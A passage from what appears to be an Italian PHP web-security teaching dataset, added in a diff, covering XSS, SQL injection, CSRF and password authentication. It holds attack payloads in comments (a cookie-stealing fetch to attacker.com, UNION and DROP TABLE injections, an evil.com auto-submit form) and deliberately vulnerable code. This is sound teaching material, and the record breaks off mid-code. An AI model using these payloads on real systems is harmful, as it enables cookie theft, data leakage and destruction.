+      "code_example": "<?php\n/**\n * PREVENZIONE XSS - Output Encoding\n * REGOLA D'ORO: Never trust user input, always encode output\n */\n\n// ============================================\n// ESEMPIO VULNERABILE - Reflected XSS\n// ============================================\n$nome = $_GET['nome'] ?? '';\n\n// VULNERABILE: echo diretto input utente\necho \"<h1>Benvenuto \" . $nome . \"</h1>\";\n\n/**\n * ATTACK VECTOR:\n * URL: script.php?nome=<script>alert(document.cookie)</script>\n * Output HTML: <h1>Benvenuto <script>alert(document.cookie)</script></h1>\n * Risultato: JavaScript eseguito, cookie rubato\n * \n * Altri payloads:\n * - <img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">\n * - <svg onload=\"window.location='https://attacker.com'\">\n * - <iframe src=\"javascript:alert('XSS')\">\n */\n\n// ============================================\n// VERSIONE SICURA - htmlspecialchars\n// ============================================\n$nome = $_GET['nome'] ?? '';\n\n// SICURO: encoding HTML completo\necho \"<h1>Benvenuto \" . htmlspecialchars($nome, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . \"</h1>\";\n\n/**\n * Trasformazioni htmlspecialchars:\n * < -> &lt;\n * > -> &gt;\n * \" -> &quot;\n * ' -> &#039; (con ENT_QUOTES)\n * & -> &amp;\n * \n * Payload diventa: &lt;script&gt;alert(document.cookie)&lt;/script&gt;\n * Browser renderizza come testo, non esegue\n */\n\n// ============================================\n// STORED XSS - Database e Output\n// ============================================\n\n// INSERIMENTO: validazione input\n$commento = $_POST['commento'] ?? '';\n\n// Validazione lunghezza\nif (strlen($commento) > 500) {\n    exit('Commento troppo lungo');\n}\n\n// Salva RAW in database (non encodare in INSERT!)\n$stmt = $mysqli->prepare('INSERT INTO commenti (testo, user_id) VALUES (?, ?)');\n$stmt->bind_param('si', $commento, $user_id);\n$stmt->execute();\n\n// LETTURA: encode durante OUTPUT\n$stmt = $mysqli->prepare('SELECT testo, username FROM commenti ORDER BY created_at DESC');\n$stmt->execute();\n$result = $stmt->get_result();\n\nwhile ($row = $result->fetch_assoc()) {\n    // CRITICO: htmlspecialchars su output\n    $testoSafe = htmlspecialchars($row['testo'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');\n    $userSafe = htmlspecialchars($row['username'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');\n    \n    echo \"<div class='comment'>\";\n    echo \"  <strong>$userSafe:</strong> $testoSafe\";\n    echo \"</div>\";\n}\n\n// ============================================\n// CONTENT SECURITY POLICY (CSP) - Difesa avanzata\n// ============================================\n\n// Header CSP blocca inline scripts e eval\nheader(\"Content-Security-Policy: \" .\n    \"default-src 'self'; \" .\n    \"script-src 'self' 'nonce-\" . $nonce . \"'; \" .  // Solo script con nonce\n    \"style-src 'self' 'unsafe-inline'; \" .           // CSS inline ok\n    \"img-src 'self' https:; \" .                      // Immagini HTTPS\n    \"object-src 'none'; \" .                           // Blocca Flash/Java\n    \"base-uri 'self'; \" .                             // Previeni base tag injection\n    \"form-action 'self'\"                              // Solo form same-origin\n);\n\n// Genera nonce casuale per script legittimi\n$nonce = bin2hex(random_bytes(16));\n\n?>\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <!-- Script legittimo con nonce -->\n    <script nonce=\"<?= htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8') ?>\">\n        console.log('Script autorizzato');\n    </script>\n</head>\n<body>\n    <!-- Inline script bloccato da CSP -->\n    <button onclick=\"alert('XSS')\">Click</button>  <!-- NON ESEGUE -->\n</body>\n</html>\n\n<?php\n/**\n * VALIDAZIONE INPUT (defense in depth)\n * Non sostituisce output encoding, ma riduce superficie attacco\n */\n\nfunction valida_input_testo(string $input, int $maxLen = 1000): string {\n    // Trim whitespace\n    $input = trim($input);\n    \n    // Limita lunghezza\n    if (strlen($input) > $maxLen) {\n        throw new InvalidArgumentException('Input troppo lungo');\n    }\n    \n    // Opzionale: rimuovi caratteri di controllo pericolosi\n    $input = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]/u', '', $input);\n    \n    return $input;\n}\n\n// Uso\ntry {\n    $testoValidato = valida_input_testo($_POST['testo'] ?? '', 500);\n    // Salva in DB...\n} catch (InvalidArgumentException $e) {\n    exit('Input non valido');\n}\n?>",
+      "security_notes": [
+        "Output encoding OBBLIGATORIO su TUTTI i dati derivati da input utente",
+        "htmlspecialchars con ENT_QUOTES (encode anche apici singoli)",
+        "ENT_SUBSTITUTE sostituisce caratteri invalidi invece di eliminarli",
+        "UTF-8 charset esplicito per prevenire encoding-based bypass",
+        "Content-Security-Policy header blocca inline script (difesa avanzata)",
+        "Validazione input è defense in depth, non sostituisce encoding",
+        "XSS Stored più pericoloso di Reflected (persistente, colpisce tutti)",
+        "Sanitizzare anche JSON output: json_encode(..., JSON_HEX_TAG | JSON_HEX_AMP)"
+      ],
+      "common_mistakes": [
+        "Echo diretto $_GET/$_POST/$_COOKIE senza htmlspecialchars (XSS critica)",
+        "Encodare in INSERT invece che in OUTPUT (double encoding, dati corrotti)",
+        "Usare strip_tags invece di htmlspecialchars (bypassabile)",
+        "Dimenticare ENT_QUOTES (XSS via attributi HTML con apici)",
+        "Non specificare UTF-8 charset (encoding-based bypass)",
+        "Trustare dati 'interni' senza encoding (stored XSS da admin compromesso)"
+      ],
+      "best_practices": [
+        "Template engine con auto-escaping (Twig, Blade, Smarty)",
+        "Separare logica da presentazione (MVC pattern)",
+        "CSP con nonce per script legittimi",
+        "HTTPOnly flag per cookie sensibili (previene cookie theft via XSS)",
+        "X-Content-Type-Options: nosniff header",
+        "X-Frame-Options: DENY per prevenire clickjacking",
+        "Sanitizzazione specifica per contesto: HTML, JS, URL, CSS"
+      ],
+      "learning_objectives": [
+        "Comprendere meccanismi XSS (Reflected, Stored, DOM)",
+        "Applicare output encoding corretto con htmlspecialchars",
+        "Implementare Content-Security-Policy",
+        "Distinguere validazione input da output encoding"
+      ],
+      "related_concepts": [
+        "PHP-FORMS-001",
+        "PHP-MYSQLI-001",
+        "PHP-COOKIE-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-SECURITY-SQLI-001",
+      "topic": "SQL Injection: Attacco e Difesa",
+      "category": "Web Security",
+      "difficulty_level": "advanced",
+      "explanation": "SQL Injection è l'iniezione di codice SQL malevolo in query tramite input utente non sanitizzato. Permette bypass autenticazione, data leakage, modifiche non autorizzate, command execution. Attacco avviene quando input utente è concatenato direttamente in SQL string. Difesa UNICA efficace: prepared statements con parametri bind. Binding separa struttura query (SQL) da dati (parametri), impedendo manipolazione logica query. Alternative insufficienti: mysqli_real_escape_string (bypasses esistono), validazione input (non copre tutti casi).",
+      "code_example": "<?php\n/**\n * SQL INJECTION - Attacco e Difesa Completa\n * Esempi tratti da capitoli/09_Database_MySQLi.tex\n */\n\n$mysqli = new mysqli('localhost', 'user', 'pass', 'database');\n$mysqli->set_charset('utf8mb4');\n\n// ============================================\n// ESEMPIO VULNERABILE - SQL Injection\n// ============================================\n\n$email = $_GET['email'] ?? '';\n\n// VULNERABILE: concatenazione diretta\n$sql = \"SELECT id, name FROM users WHERE email = '\" . $email . \"'\";\n$result = $mysqli->query($sql);\n\nif ($result) {\n    while ($row = $result->fetch_assoc()) {\n        echo htmlspecialchars($row['name']) . '<br>';\n    }\n}\n\n/**\n * ============================================\n * ATTACK VECTORS - Payloads SQL Injection\n * ============================================\n * \n * 1. BYPASS AUTENTICAZIONE\n *    Input: admin' OR '1'='1\n *    Query: SELECT id, name FROM users WHERE email = 'admin' OR '1'='1'\n *    Risultato: OR '1'='1' è sempre vero, ritorna TUTTI gli utenti\n * \n * 2. COMMENT OUT\n *    Input: admin'--\n *    Query: SELECT id, name FROM users WHERE email = 'admin'--'\n *    Risultato: -- commenta resto query, bypass password check\n * \n * 3. UNION-BASED DATA LEAKAGE\n *    Input: x' UNION SELECT password, email FROM users--\n *    Query: SELECT id, name FROM users WHERE email = 'x' \n *           UNION SELECT password, email FROM users--'\n *    Risultato: leak password hash da tabella users\n * \n * 4. BLIND SQL INJECTION\n *    Input: x' AND SLEEP(5)--\n *    Query: SELECT id, name FROM users WHERE email = 'x' AND SLEEP(5)--'\n *    Risultato: delay 5 secondi se query valida (enumera struttura DB)\n * \n * 5. STACKED QUERIES (MySQL limitato, PostgreSQL vulnerabile)\n *    Input: x'; DROP TABLE users;--\n *    Query: SELECT id, name FROM users WHERE email = 'x'; DROP TABLE users;--'\n *    Risultato: elimina tabella users (distruttivo)\n * \n * 6. ERROR-BASED INJECTION\n *    Input: x' AND 1=CONVERT(int, (SELECT @@version))--\n *    Risultato: errore SQL espone versione database\n */\n\n// ============================================\n// VERSIONE SICURA - Prepared Statement\n// ============================================\n\n$email = $_GET['email'] ?? '';\n\n// SICURO: prepared statement con placeholder\n$stmt = $mysqli->prepare('SELECT id, name FROM users WHERE email = ?');\n\nif (!$stmt) {\n    error_log('Prepare failed: ' . $mysqli->error);\n    exit('Errore query');\n}\n\n// Bind parametro\n$stmt->bind_param('s', $email);\n\n// Execute\n$stmt->execute();\n\n// Fetch results\n$result = $stmt->get_result();\nwhile ($row = $result->fetch_assoc()) {\n    echo htmlspecialchars($row['name']) . '<br>';\n}\n\n$stmt->close();\n\n/**\n * PERCHÉ PREPARED STATEMENTS SONO SICURI:\n * \n * 1. Separazione struttura/dati\n *    - SQL inviato al server: SELECT ... WHERE email = ?\n *    - Parametro inviato separatamente: \"admin' OR '1'='1\"\n *    - Server tratta parametro come DATO, non come SQL\n * \n * 2. Type binding\n *    - 's' indica parametro è stringa\n *    - MySQL applica escaping automatico corretto per tipo\n *    - Impossibile uscire da contesto stringa\n * \n * 3. Pre-compilazione\n *    - Query compilata una volta, riutilizzabile\n *    - Performance migliori per query ripetute\n *    - Query caching server-side\n */\n\n// ============================================\n// LOGIN SICURO - Caso studio completo\n// ============================================\n\nfunction login_sicuro($mysqli, $username, $password) {\n    // Prepared statement per fetch utente\n    $stmt = $mysqli->prepare(\n        'SELECT id, username, password_hash FROM users WHERE username = ? LIMIT 1'\n    );\n    \n    if (!$stmt) {\n        error_log('Login prepare failed: ' . $mysqli->error);\n        return false;\n    }\n    \n    $stmt->bind_param('s', $username);\n    $stmt->execute();\n    $result = $stmt->get_result();\n    $user = $result->fetch_assoc();\n    $stmt->close();\n    \n    if (!$user) {\n        // Utente non trovato - messaggio generico\n        return false;\n    }\n    \n    // Verifica password con password_verify (timing-safe)\n    if (!password_verify($password, $user['password_hash'])) {\n        return false;\n    }\n    \n    // Login successo\n    return $user;\n}\n\n// Uso\n$username = $_POST['username'] ?? '';\n$password = $_POST['password'] ?? '';\n\n$user = login_sicuro($mysqli, $username, $password);\n\nif ($user) {\n    session_regenerate_id(true);\n    $_SESSION['user_id'] = $user['id'];\n    $_SESSION['username'] = $user['username'];\n    header('Location: /dashboard.php', true, 303);\n    exit;\n} else {\n    // Messaggio generico (no information disclosure)\n    $error = 'Credenziali non valide';\n}\n\n// ============================================\n// ALTERNATIVE INSUFFICIENTI\n// ============================================\n\n// mysqli_real_escape_string - NON SICURO\n$email = $mysqli->real_escape_string($_GET['email'] ?? '');\n$sql = \"SELECT * FROM users WHERE email = '$email'\";\n// PROBLEMI:\n// - Richiede quotes manuali (dimenticare = vulnerabile)\n// - Bypass con encoding tricks\n// - Non funziona per LIKE pattern, numeri, identificatori\n\n// Validazione input - INSUFFICIENTE da sola\nif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {\n    exit('Email invalida');\n}\n$sql = \"SELECT * FROM users WHERE email = '$email'\";\n// PROBLEMA: validazione non copre tutti attack vectors\n// Defense in depth: validazione + prepared statements\n\n// ============================================\n// BEST PRACTICES\n// ============================================\n\n// 1. Least privilege DB user\n// GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';\n// (NO DELETE, NO DROP, NO CREATE)\n\n// 2. Stored procedures (difesa aggiuntiva)\n// CALL get_user_by_email(?)\n\n// 3. ORM (Eloquent, Doctrine) con query builder sicuri\n// User::where('email', $email)->first(); // Auto-parameterized\n\n// 4. Web Application Firewall (WAF) - ModSecurity\n// Rileva pattern SQL injection in richieste\n\n$mysqli->close();\n?>",
+      "security_notes": [
+        "Prepared statements UNICA difesa efficace contro SQL injection",
+        "SEMPRE usare bind_param, mai concatenare variabili in SQL",
+        "mysqli_real_escape_string INSUFFICIENTE (bypass esistono)",
+        "Validazione input è defense in depth, non sostituto di prepared statements",
+        "Least privilege: DB user con permessi minimi (NO DROP, NO CREATE)",
+        "Messaggi errore generici: no SQL error details in output utente",
+        "WAF (ModSecurity) rileva pattern injection in richieste",
+        "Audit logging query fallite con IP per detection attacchi"
+      ],
+      "common_mistakes": [
+        "Concatenare input utente in SQL string (vulnerabilità critica)",
+        "Usare mysqli_real_escape_string e credere di essere sicuri",
+        "Validare input senza prepared statements (insufficiente)",
+        "Esporre errori SQL in output (information disclosure)",
+        "DB user con privilegi eccessivi (DROP, ALTER, FILE)",
+        "Non loggare tentativi di injection (attacchi non rilevati)",
+        "Dimenticare LIMIT 1 in query che dovrebbero ritornare record singolo"
+      ],
+      "best_practices": [
+        "Usare PDO con prepared statements per portabilità",
+        "ORM con query builder auto-parameterizzati (Eloquent, Doctrine)",
+        "WAF per rilevamento pattern injection (ModSecurity, CloudFlare)",
+        "Principle of least privilege per DB accounts",
+        "Stored procedures per logica complessa",
+        "Penetration testing regolare con sqlmap",
+        "Code review focalizzate su costruzione query",
+        "Static analysis tools (PHPStan, Psalm) per detection vulnerabilità"
+      ],
+      "learning_objectives": [
+        "Comprendere meccanismi SQL injection e attack vectors",
+        "Implementare prepared statements correttamente",
+        "Riconoscere pattern vulnerabili in codice legacy",
+        "Applicare defense in depth per database security"
+      ],
+      "related_concepts": [
+        "PHP-MYSQLI-001",
+        "PHP-FORMS-001",
+        "PHP-AUTH-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-SECURITY-CSRF-001",
+      "topic": "Cross-Site Request Forgery (CSRF) Protection",
+      "category": "Web Security",
+      "difficulty_level": "advanced",
+      "explanation": "CSRF (Cross-Site Request Forgery) è un attacco dove l'attaccante induce la vittima autenticata a eseguire azioni non intenzionali (cambio password, trasferimento fondi, etc.). Funziona sfruttando sessione valida: browser invia automaticamente cookie di sessione anche per richieste cross-site. Difese: 1) Token CSRF in form (valore casuale in sessione, verificato server-side), 2) SameSite=Strict cookie (blocca invio cross-site), 3) Verifica Referer/Origin header, 4) Re-autenticazione per azioni critiche. Nota: il corso implementa mitigazione via SameSite cookie, senza token espliciti.",
+      "code_example": "<?php\n/**\n * CSRF PROTECTION - Token-based e SameSite Cookie\n * Nota: esempi corso usano SameSite cookie come mitigazione principale\n */\n\n// ============================================\n// CSRF ATTACK SCENARIO\n// ============================================\n\n/**\n * ESEMPIO ATTACCO:\n * \n * 1. Vittima autenticata su bank.com (sessione valida)\n * \n * 2. Attaccante invia email con link a evil.com\n * \n * 3. evil.com contiene form nascosto:\n *    <form action=\"https://bank.com/transfer\" method=\"POST\">\n *      <input type=\"hidden\" name=\"to\" value=\"attacker\">\n *      <input type=\"hidden\" name=\"amount\" value=\"10000\">\n *    </form>\n *    <script>document.forms[0].submit();</script>\n * \n * 4. Browser vittima invia POST a bank.com con cookie sessione valido\n * \n * 5. bank.com esegue trasferimento (crede sia richiesta legittima)\n * \n * RISULTATO: Fondi trasferiti senza consenso vittima\n */\n\n// ============================================\n// DIFESA 1: Token CSRF in Sessione\n// ============================================\n\nsession_start([\n    'cookie_httponly' => true,\n    'cookie_secure' => true,\n    'cookie_samesite' => 'Strict',  // Prima linea difesa\n]);\n\n/**\n * Genera token CSRF per form\n */\nfunction csrf_token_generate(): string {\n    if (!isset($_SESSION['csrf_token'])) {\n        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));\n    }\n    return $_SESSION['csrf_token'];\n}\n\n/**\n * Verifica token CSRF da request\n */\nfunction csrf_token_verify(string $token): bool {\n    if (!isset($_SESSION['csrf_token'])) {\n        return false;\n    }\n    // Timing-safe comparison\n    return hash_equals($_SESSION['csrf_token'], $token);\n}\n\n// FORM HTML con token CSRF\n$csrfToken = csrf_token_generate();\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Form Sicuro</title>\n</head>\n<body>\n    <form method=\"POST\" action=\"/transfer.php\">\n        <!-- Token CSRF nascosto -->\n        <input type=\"hidden\" name=\"csrf_token\" \n               value=\"<?= htmlspecialchars($csrfToken, ENT_QUOTES, 'UTF-8') ?>\">\n        \n        <label>Destinatario:\n            <input type=\"text\" name=\"to\" required>\n        </label>\n        \n        <label>Importo:\n            <input type=\"number\" name=\"amount\" required>\n        </label>\n        \n        <button type=\"submit\">Trasferisci</button>\n    </form>\n</body>\n</html>\n\n<?php\n// ============================================\n// PROCESSING con verifica CSRF token\n// ============================================\n\n// transfer.php\nsession_start([\n    'cookie_httponly' => true,\n    'cookie_secure' => true,\n    'cookie_samesite' => 'Strict',\n]);\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    // Verifica token CSRF\n    $token = $_POST['csrf_token'] ?? '';\n    \n    if (!csrf_token_verify($token)) {\n        error_log('CSRF token validation failed - IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));\n        header('HTTP/1.1 403 Forbidden', true, 403);\n        exit('Richiesta non valida - token CSRF mancante o errato');\n    }\n    \n    // Token valido: processa richiesta\n    $to = $_POST['to'] ?? '';\n    $amount = (float)($_POST['amount'] ?? 0);\n    \n    // Validazioni business logic\n    if ($amount <= 0 || $amount > 10000) {\n        exit('Importo non valido');\n    }\n    \n    // Esegui trasferimento con prepared statement\n    $stmt = $mysqli->prepare('INSERT INTO transfers (from_user, to_user, amount) VALUES (?, ?, ?)');\n    $stmt->bind_param('isd', $_SESSION['user_id'], $to, $amount);\n    $stmt->execute();\n    \n    // Rigenera token dopo uso (one-time token pattern)\n    unset($_SESSION['csrf_token']);\n    \n    header('Location: /success.php', true, 303);\n    exit;\n}\n\n// ============================================\n// DIFESA 2: SameSite Cookie (Mitigazione)\n// ============================================\n\n/**\n * SameSite Cookie Attributes:\n * \n * - Strict: Cookie MAI inviato in richieste cross-site\n *   PRO: Massima protezione CSRF\n *   CONTRO: Break legittimi link esterni (es. email, social)\n * \n * - Lax: Cookie inviato solo per navigazione top-level GET\n *   PRO: Bilancia sicurezza/usabilità\n *   CONTRO: GET POST form ancora vulnerabili\n * \n * - None: Cookie sempre inviato (richiede Secure flag)\n *   PRO: Compatibilità legacy\n *   CONTRO: Nessuna protezione CSRF\n */\n\n// Configurazione sessione con SameSite\nsession_set_cookie_params([\n    'lifetime' => 0,\n    'path' => '/',\n    'domain' => '',\n    'secure' => true,\n    'httponly' => true,\n    'samesite' => 'Strict',  // Mitigazione CSRF\n]);\nsession_start();\n\n// ============================================\n// DIFESA 3: Verifica Referer/Origin Header\n// ============================================\n\nfunction verify_origin(): bool {\n    $origin = $_SERVER['HTTP_ORIGIN'] ?? '';\n    $referer = $_SERVER['HTTP_REFERER'] ?? '';\n    \n    $allowedOrigins = ['https://bank.com'];\n    \n    // Verifica Origin header (POST/PUT/DELETE)\n    if ($origin !== '') {\n        return in_array($origin, $allowedOrigins, true);\n    }\n    \n    // Fallback: Referer header (meno affidabile)\n    if ($referer !== '') {\n        foreach ($allowedOrigins as $allowed) {\n            if (str_starts_with($referer, $allowed)) {\n                return true;\n            }\n        }\n    }\n    \n    return false;\n}\n\n// Uso in processing\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    if (!verify_origin()) {\n        error_log('Origin check failed');\n        exit('Richiesta cross-origin non consentita');\n    }\n    // Processa...\n}\n\n// ============================================\n// DIFESA 4: Re-autenticazione Operazioni Critiche\n// ============================================\n\nfunction require_password_confirm($mysqli, $user_id, $password): bool {\n    $stmt = $mysqli->prepare('SELECT password_hash FROM users WHERE id = ?');\n    $stmt->bind_param('i', $user_id);\n    $stmt->execute();\n    $result = $stmt->get_result();\n    $user = $result->fetch_assoc();\n    $stmt->close();\n    \n    if (!$user) {\n        return false;\n    }\n    \n    return password_verify($password, $user['password_hash']);\n}\n\n// Cambio password con re-auth\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $currentPassword = $_POST['current_password'] ?? '';\n    $newPassword = $_POST['new_password'] ?? '';\n    \n    // Verifica password corrente\n    if (!require_password_confirm($mysqli, $_SESSION['user_id'], $currentPassword)) {\n        exit('Password corrente errata');\n    }\n    \n    // Processa cambio password...\n}\n?>",
+      "security_notes": [
+        "Token CSRF unico per sessione, verificato server-side su POST/PUT/DELETE",
+        "SameSite=Strict cookie blocca richieste cross-site (mitigazione efficace)",
+        "hash_equals() per confronto timing-safe dei token",
+        "One-time token: rigenera dopo uso per operazioni critiche",
+        "Verifica Origin/Referer header come defense in depth",
+        "Re-autenticazione per azioni sensibili (cambio password, trasferimenti)",
+        "CSRF token NON necessario per GET (non dovrebbero modificare stato)",
+        "Loggare fallimenti validazione CSRF per detection attacchi"
+      ],
+      "common_mistakes": [
+        "Non implementare CSRF protection su form POST (vulnerabilità critica)",
+        "Usare == invece di hash_equals per confronto token (timing attack)",
+        "Token CSRF in GET parameter (leakage via Referer header)",
+        "Trustare solo SameSite senza token (compatibilità browser incerta)",
+        "Non rigenerare token dopo uso (token reusability)",
+        "Dimenticare CSRF check su API endpoints",
+        "Token CSRF in localStorage invece di sessione (XSS leakage)"
+      ],
+      "best_practices": [
+        "Double Submit Cookie pattern per stateless CSRF protection",
+        "Framework integrati: Laravel CSRF middleware, Symfony Form CSRF",
+        "CAPTCHA per form pubblici critici (registrazione, contatto)",
+        "Notifiche email/SMS per azioni sensibili",
+        "Audit logging richieste con CSRF failures",
+        "Penetration testing con Burp Suite CSRF PoC generator",
+        "Content-Type validation: require application/json per API"
+      ],
+      "learning_objectives": [
+        "Comprendere meccanismi CSRF attack",
+        "Implementare token CSRF con verifica timing-safe",
+        "Configurare SameSite cookie per mitigazione",
+        "Applicare defense in depth con multiple strategie"
+      ],
+      "related_concepts": [
+        "PHP-SESSION-001",
+        "PHP-COOKIE-001",
+        "PHP-FORMS-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-AUTH-001",
+      "topic": "Autenticazione Sicura con Password Hashing",
+      "category": "Authentication & Authorization",
+      "difficulty_level": "advanced",
+      "explanation": "Sistema di autenticazione sicuro richiede: 1) Password hashing con password_hash() (bcrypt o Argon2id), 2) Validazione robusta password (lunghezza min 8, classi caratteri miste), 3) Rate limiting tentativi login, 4) Session regeneration dopo login, 5) HTTPS obbligatorio, 6) Prepared statements per query DB. Password hashing è one-way: impossibile recuperare plaintext, solo verificare con password_verify(). Argon2id preferito (resistente GPU attacks), fallback bcrypt cost 12.",
+      "code_example": "<?php\n/**\n * AUTENTICAZIONE SICURA - auth/auth_lib.php\n * Sistema completo: registrazione, login, logout, password hashing\n */\n\n// Configurazione DB\nconst DB_HOST = 'localhost';\nconst DB_USER = 'user';\nconst DB_PASS = 'pass';\nconst DB_NAME = 'appdb';\n\n// ============================================\n// SESSIONI SICURE\n// ============================================\n\nfunction secure_session_start(): void {\n    $isHttps = !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on';\n    \n    session_set_cookie_params([\n        'lifetime' => 0,\n        'path' => '/',\n        'domain' => '',\n        'secure' => $isHttps,      // HTTPS obbligatorio in produzione\n        'httponly' => true,         // Previene XSS cookie theft\n        'samesite' => 'Strict',     // Previene CSRF\n    ]);\n    \n    ini_set('session.use_strict_mode', '1');\n    session_start();\n}\n\nfunction regenerate_session(): void {\n    // Previene session fixation\n    session_regenerate_id(true);\n}\n\n// ============================================\n// RATE LIMITING\n// ============================================\n\nfunction rate_limit(string $key, int $maxAttempts, int $windowSeconds): bool {\n    $now = time();\n    \n    if (!isset($_SESSION['_rate'][$key])) {\n        $_SESSION['_rate'][$key] = [];\n    }\n    \n    // Pulisci tentativi vecchi\n    $filtered = [];\n    foreach ($_SESSION['_rate'][$key] as $timestamp) {\n        if (($now - (int)$timestamp) <= $windowSeconds) {\n            $filtered[] = (int)$timestamp;\n        }\n    }\n    $_SESSION['_rate'][$key] = $filtered;\n    \n    // Verifica limite\n    if (count($_SESSION['_rate'][$key]) >= $maxAttempts) {\n        return false;  // Rate limit exceeded\n    }\n    \n    // Registra tentativo\n    $_SESSION['_rate'][$key][] = $now;\n    return true;\n}\n\n// ============================================\n// VALIDAZIONE INPUT\n// ============================================\n\nfunction validate_username(string $username): bool {\n    // 3-32 caratteri, alfanumerici + underscore\n    if (strlen($username) < 3 || strlen($username) > 32) {\n        return false;\n    }\n    return (bool)preg_match('/^[A-Za-z0-9_]+$/', $username);\n}\n\nfunction validate_email(string $email): bool {\n    return (bool)filter_var($email, FILTER_VALIDATE_EMAIL);\n}\n\nfunction validate_password(string $password): bool {\n    $len = strlen($password);\n    \n    // Lunghezza: 8-72 caratteri (limite bcrypt 72)\n    if ($len < 8 || $len > 72) {\n        return false;\n    }\n    \n    // Richiedi almeno 3 classi di caratteri\n    $hasLower = (bool)preg_match('/[a-z]/', $password);\n    $hasUpper = (bool)preg_match('/[A-Z]/', $password);\n    $hasDigit = (bool)preg_match('/\\d/', $password);\n    $hasSpecial = (bool)preg_match('/[^A-Za-z0-9]/', $password);\n    \n    $categories = $hasLower + $hasUpper + $hasDigit + $hasSpecial;\n    return $categories >= 3;\n}\n\n// ============================================\n// PASSWORD HASHING\n// ============================================\n\nfunction hash_password(string $password): string {\n    // Preferisci Argon2id (resistente GPU/ASIC attacks)\n    if (defined('PASSWORD_ARGON2ID')) {\n        return password_hash($password, PASSWORD_ARGON2ID, [\n            'memory_cost' => 65536,  // 64MB\n            'time_cost' => 4,\n            'threads' => 2,\n        ]);\n    }\n    \n    // Fallback: bcrypt con cost 12\n    return password_hash($password, PASSWORD_DEFAULT, ['cost' => 12]);\n}\n\nfunction verify_password(string $password, string $hash): bool {\n    return password_verify($password, $hash);\n}\n\nfunction needs_rehash(string $hash): bool {\n    // Verifica se hash usa algoritmo/parametri obsoleti\n    if (defined('PASSWORD_ARGON2ID')) {\n        return password_needs_rehash($hash, PASSWORD_ARGON2ID);\n    }\n    return password_needs_rehash($hash, PASSWORD_DEFAULT, ['cost' => 12]);\n}\n\n// ============================================\n// DATABASE\n// ============================================\n\nfunction db(): mysqli {\n    $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);\n    \n    if ($mysqli->connect_errno) {\n        error_log('DB error: ' . $mysqli->connect_error);\n        exit('Database non disponibile');\n    }\n    \n    $mysqli->set_charset('utf8mb4');\n    return $mysqli;\n}\n\nfunction find_user_by_username(mysqli $db, string $username): ?array {\n    $stmt = $db->prepare('SELECT id, username, email, password_hash FROM users WHERE username = ? LIMIT 1');\n    if (!$stmt) { return null; }\n    \n    $stmt->bind_param('s', $username);\n    $stmt->execute();\n    $result = $stmt->get_result();\n    $user = $result ? $result->fetch_assoc() : null;\n    $stmt->close();\n    \n    return $user ?: null;\n}\n\nfunction create_user(mysqli $db, string $username, string $email, string $password): bool {\n    $hash = hash_password($password);\n    \n    $stmt = $db->prepare('INSERT INTO users (username, email, password_hash, created_at) VALUES (?, ?, ?, NOW())');\n    if (!$stmt) { return false; }\n    \n    $stmt->bind_param('sss', $username, $email, $hash);\n    $ok = $stmt->execute();\n    \n    if (!$ok) {\n        error_log('Create user error: ' . $stmt->error);\n    }\n    \n    $stmt->close();\n    return $ok;\n}\n\n// ============================================\n// REGISTRAZIONE\n// ============================================\n\nsecure_session_start();\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $email = trim($_POST['email'] ?? '');\n    $password = $_POST['password'] ?? '';\n    \n    // Validazioni\n    if (!validate_username($username)) {\n        exit('Username non valido (3-32 caratteri alfanumerici)');\n    }\n    \n    if (!validate_email($email)) {\n        exit('Email non valida');\n    }\n    \n    if (!validate_password($password)) {\n        exit('Password debole (min 8 caratteri, 3 classi)');\n    }\n    \n    // Rate limiting\n    if (!rate_limit('register', 3, 3600)) {\n        exit('Troppi tentativi registrazione - riprova tra 1 ora');\n    }\n    \n    $db = db();\n    \n    // Verifica username univoco\n    if (find_user_by_username($db, $username)) {\n        exit('Username già in uso');\n    }\n    \n    // Crea utente\n    if (create_user($db, $username, $email, $password)) {\n        header('Location: /login.php?registered=1', true, 303);\n        exit;\n    } else {\n        exit('Errore registrazione');\n    }\n}\n\n// ============================================\n// LOGIN\n// ============================================\n\nsecure_session_start();\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $password = $_POST['password'] ?? '';\n    \n    // Rate limiting: max 5 tentativi in 15 minuti\n    if (!rate_limit('login', 5, 900)) {\n        error_log('Login rate limit exceeded - IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));\n        exit('Troppi tentativi login - riprova tra 15 minuti');\n    }\n    \n    $db = db();\n    $user = find_user_by_username($db, $username);\n    \n    // Timing-safe: sempre verifica password anche se utente non esiste\n    $dummyHash = '$2y$12$dummy...';\n    $hash = $user ? $user['password_hash'] : $dummyHash;\n    $valid = verify_password($password, $hash);\n    \n    if (!$user || !$valid) {\n        // Messaggio generico (no information disclosure)\n        exit('Credenziali non valide');\n    }\n    \n    // Login successo\n    regenerate_session();  // Previeni session fixation\n    \n    $_SESSION['user_id'] = $user['id'];\n    $_SESSION['username'] = $user['username'];\n    $_SESSION['authenticated'] = true;\n    $_SESSION['login_time'] = time();\n    \n    // Rehash password se algoritmo obsoleto\n    if (needs_rehash($hash)) {\n        $newHash = hash_password($password);\n        $stmt = $db->prepare('UPDATE users SET password_hash = ? WHERE id = ?');\n        $stmt->bind_param('si', $newHash, $user['id']);\n        